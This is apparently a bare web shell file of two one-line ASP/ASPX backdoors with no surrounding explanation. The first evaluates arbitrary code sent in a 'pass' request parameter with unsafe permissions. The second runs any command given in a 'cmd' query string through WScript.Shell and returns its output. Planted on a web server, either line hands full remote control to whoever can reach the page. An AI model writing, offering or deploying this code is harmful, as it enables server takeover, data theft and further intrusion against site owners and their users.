<%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>

<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>
